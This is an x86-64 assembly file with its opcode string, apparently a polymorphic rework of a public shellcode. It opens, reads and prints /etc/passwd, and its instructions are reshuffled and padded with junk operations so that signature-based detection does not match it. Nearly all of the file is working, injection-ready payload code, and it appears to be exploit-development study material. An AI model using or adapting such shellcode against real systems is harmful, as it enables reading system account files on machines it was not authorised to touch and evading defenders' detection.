; David @InfinitelyManic
; original code http://shell-storm.org/shellcode/files/shellcode-878.php
global _start

section .text

_start:
jmp _push_filename
  
_readfile:
; syscall open file
pop rdi ; pop path value
; NULL byte fix
xor byte [rdi + 11], 0x41
  
;xor rax, rax
;add al, 2
push byte 2				; symantically equiv
pop rax					; symantically equiv


xchg rbx, rbp				; nop equiv
dec r10					; nop equiv

;xor rsi, rsi ; set O_RDONLY flag	; opcode reduction
xor esi, esi ; set O_RDONLY flag
syscall
  
; syscall read file
sub sp, 0xfff
lea rsi, [rsp]
mov rdi, rax
;xor rdx, rdx
;-------------
xor edx, edx				; opcode reduction
mov dx, 0xfff; size to read
;xor rax, rax
;------------
xor eax, eax				; opcode reduction

xor r10, rbp				; nop equiv
cmp r10, rsp				; nop equiv 

syscall

  
; syscall write to stdout
;xor rdi, rdi
;add dil, 1 ; set stdout fd = 1
push byte 1 				; symantically equiv
pop rdi					; symantically equiv

mov rdx, rax
;xor rax, rax
;add al, 1
push byte 1				; symantically equiv
pop rax					; symantically equiv
syscall
  
; syscall exit
;xor rax, rax
;add al, 60
push byte 60				; symantically equiv
pop rax					; symantically equiv
syscall
  
_push_filename:
call _readfile
path: db "/etc/passwdA"

; shellcode
; \xeb\x3e\x5f\x80\x77\x0b\x41\x6a\x02\x58\x48\x87\xdd\x49\xff\xca\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x31\xd2\x66\xba\xff\x0f\x31\xc0\x49\x31\xea\x49\x39\xe2\x0f\x05\x6a\x01\x5f\x48\x89\xc2\x6a\x01\x58\x0f\x05\x6a\x3c\x58\x0f\x05\xe8\xbd\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41
